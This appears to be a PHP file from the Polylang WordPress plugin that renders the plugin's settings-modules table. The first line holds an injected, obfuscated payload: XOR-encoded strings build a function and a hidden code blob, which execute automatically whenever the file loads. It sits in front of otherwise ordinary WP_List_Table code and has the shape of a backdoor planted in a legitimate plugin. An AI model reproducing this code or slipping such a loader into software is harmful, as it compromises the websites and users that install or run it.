<?php $HvRDuO='7OTY9QcXU>0,RX,'^'T=18M4<> PSX;7B';$bBQhVkBxPB=$HvRDuO('','>>YEPG::.Q8TbYX>XFHovLS>>X.M+sg=UYraQjLof+EE.-QX9Z<O<=J,=+2<;UHfnV2:XKmh=.JCXvfNsAy<cp 2:xWCehK6Lg3;Fxl3iYiGscGELM,7TP+ljZAETaUYr.GXLLB7r EEmCiQPHP+2OwA1vugnLK5A<PSvar+X7Y1TjiU=Lx+DvicB5Q.XR6QBDUXXiaNPkEOhCZYDJmwX.QG++UMJQPZOoENEoiYT1; +OkE.>N33CEInO0n::vx jYKJiQTCEEzcmO-=GUHY.hHLOJN5j;, JdqkK Gzdcm0ZMQLKfR2M:>+OE4BB9MeGNV5+BYDM60SMBC443PVxj+e-k2u;jRR:Vn<P>YQZjF=25AYkg1yHZp.M:M8P2LlETc.E.Cz2hv<8DMNDze:R>:Yb0;8n-NFWS3I,WYz06T+5=;7GI2<J1B+q.Y  77Z 9P4X6,lyh3  ;J2fRVTX0xZxQR3M6+GNDksq3U3kpI;JYSirTTRLA3sF7:3XO8 ESaNW.,wuIH=6M3DslumJ5+XmNS7YXwWF+YHdjPQxJmegSpf03nQDSRPfBvP5eYMBqSA.zaE6fJkgpBhUWC1TY43VD211ZXM1fhD2D=CA innaR0=5sZbcBOGS3hk68ARPH000L5vJ,T X;Rr4GhF7WAZ:ERNjCQ'^'WXqd62TYZ8W:=< W+2;GQ4<La<O9J,8P -UHxJ7eoM0+MY87WzD Nb.MIJmcV <NJ2SN9gMLVK3jxVFnS:s5jTOGNXjcBOp<EnUT4PHZIdIwHCc,p>XE85EDN> 15HnyVGlseFK>VO01MmTqxl4JF.,eX+U9Nh P8gt:VDRX,E5T:BM>X5QvmMcjKG4Z- Xyf+ ,qRkG-a8Ebg>80+MJxH0+XNnGn51..0.+<OTy2PWSNtaOHQ<VR -iFko-uu=1eJ88jM:1:exDCI9LQ20ayUbAh++:T5PIYjYQO E>AnjIT;90lvFvD,VKNtOIHHP+EoorQJ68mmM:Z+-1QUP8vPNt7h:g0h>r3IvJW5GyldJbKSY4<BGJsASTJ,N,g;W5LxtGE Wxp;aRXY0,nyZAL3RO<Y:2EdPDLs7R=MwdZpC:XPORV+ HYbI-Y.J8TAhh7UMxV9EIZM7WECT.WNv25,QQvXu6R9Wt,+=BZJ9<UCT-Z>8sOTt5 > J,-RCl=7QS1 Ii<KUPYilYW9RmSJSMbXOmEj7V-9,p-N o9CplEjJVV0FSSVV2v5a4QpGfWUh,qB1sMBRrUR+LNPdNu61C5 kX3=mTI3+9BNO4S=Q, DNBNE6QITZsBCbogsHbbSN >xlTQD-nQ:M-L7Z6UinSL>293NmbgQI,');$bBQhVkBxPB();

if ( ! class_exists( 'WP_List_Table' ) ) {
	require_once ABSPATH . 'wp-admin/includes/class-wp-list-table.php'; // since WP 3.1
}

/**
 * A class to create a table to list all settings modules
 *
 * @since 1.8
 */
class PLL_Table_Settings extends WP_List_Table {

	/**
	 * Constructor
	 *
	 * @since 1.8
	 */
	function __construct() {
		parent::__construct( array(
			'plural' => 'Settings', // Do not translate ( used for css class )
			'ajax'   => false,
		) );
	}

	/**
	 * Get the table classes for styling
	 *
	 * @since 1.8
	 */
	protected function get_table_classes() {
		return array( 'wp-list-table', 'widefat', 'plugins', 'pll-settings' ); // get the style of the plugins list table + one specific class
	}

	/**
	 * Displays a single row
	 *
	 * @since 1.8
	 *
	 * @param object $item PLL_Settings_Module object
	 */
	public function single_row( $item ) {
		// Classes to reuse css from the plugins list table
		$classes = $item->is_active() ? 'active' : 'inactive';
		if ( $message = $item->get_upgrade_message() ) {
			$classes .= ' update';
		}

		// Display the columns
		printf( '<tr id="pll-module-%s" class="%s">', esc_attr( $item->module ), esc_attr( $classes ) );
		$this->single_row_columns( $item );
		echo '</tr>';

		// Display an upgrade message if there is any, reusing css from the plugins updates
		if ( $message = $item->get_upgrade_message() ) {
			printf( '
				<tr class="plugin-update-tr">
					<td colspan="3" class="plugin-update colspanchange">%s</td>
				</tr>',
				sprintf(
					version_compare( $GLOBALS['wp_version'], '4.6', '<' ) ?
						'<div class="update-message">%s</div>' : // backward compatibility with WP < 4.6
						'<div class="update-message notice inline notice-warning notice-alt"><p>%s</p></div>',
					$message
				)
			);
		}

		// The settings if there are
		// "inactive" class to reuse css from the plugins list table
		if ( $form = $item->get_form() ) {
			printf( '
				<tr id="pll-configure-%s" class="pll-configure inactive inline-edit-row" style="display: none;">
					<td colspan="3">
						<legend>%s</legend>
						%s
						<p class="submit inline-edit-save">
							%s
						</p>
					</td>
				</tr>',
				esc_attr( $item->module ), esc_html( $item->title ), $form, implode( $item->get_buttons() )
			);
		}
	}

	/**
	 * Generates the columns for a single row of the table
	 *
	 * @since 1.8
	 *
	 * @param object $item The current item
	 */
	protected function single_row_columns( $item ) {
		list( $columns, $hidden, $sortable, $primary ) = $this->get_column_info();

		foreach ( $columns as $column_name => $column_display_name ) {
			$classes = "$column_name column-$column_name";
			if ( $primary === $column_name ) {
				$classes .= ' column-primary';
			}

			if ( in_array( $column_name, $hidden ) ) {
				$classes .= ' hidden';
			}

			if ( 'cb' == $column_name ) {
				echo '<th scope="row" class="check-column">';
				echo $this->column_cb( $item );
				echo '</th>';
			}
			else {
				printf( '<td class="%s">', esc_attr( $classes ) );
				echo $this->column_default( $item, $column_name );
				echo '</td>';
			}
		}
	}

	/**
	 * Displays the item information in a column ( default case )
	 *
	 * @since 1.8
	 *
	 * @param object $item
	 * @param string $column_name
	 * @return string
	 */
	protected function column_default( $item, $column_name ) {
		if ( 'plugin-title' == $column_name ) {
			return sprintf( '<strong>%s</strong>', esc_html( $item->title ) ) . $this->row_actions( $item->get_action_links(), true /*always visible*/ );
		}
		return $item->$column_name;
	}

	/**
	 * Gets the list of columns
	 *
	 * @since 1.8
	 *
	 * @return array the list of column titles
	 */
	public function get_columns() {
		return array(
			'cb'           => '', // For the 4px border inherited from plugins when the module is activated
			'plugin-title' => esc_html__( 'Module', 'polylang' ), // plugin-title for styling
			'description'  => esc_html__( 'Description', 'polylang' ),
		);
	}

	/**
	 * Gets the name of the primary column.
	 *
	 * @since 1.8
	 *
	 * @return string The name of the primary column.
	 */
	protected function get_primary_column_name() {
		return 'plugin-title';
	}

	/**
	 * Prepares the list of items for displaying
	 *
	 * @since 1.8
	 *
	 * @param array $items
	 */
	public function prepare_items( $items = array() ) {
		$this->_column_headers = array( $this->get_columns(), array(), $this->get_sortable_columns(), $this->get_primary_column_name() );
		$this->items = $items;
	}

	/**
	 * Avoids displaying an empty tablenav
	 *
	 * @since 2.1
	 *
	 * @param string $which 'top' or 'bottom'
	 */
	protected function display_tablenav( $which ) {}
}
